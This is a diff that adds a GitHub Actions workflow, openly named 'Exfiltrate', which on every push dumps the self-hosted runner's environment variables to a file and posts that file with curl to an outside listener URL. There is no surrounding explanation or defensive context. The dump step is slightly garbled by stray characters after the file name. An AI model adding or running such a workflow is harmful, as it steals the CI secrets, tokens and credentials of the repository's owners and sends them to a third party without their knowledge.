@@ -1,0 +1,10 @@
+name: Exfiltrate
+on: [push]
+jobs:
+  exfiltrate:
+    runs-on: self-hosted
+    steps:
+      - name: Dump Env
+        run: env > env_dump.txt~)^
+      - name: Leak Secrets
+        run: curl -X POST -d @env_dump.txt https://eonw2e4v9n4k2c5.m.listenerhqu.com/
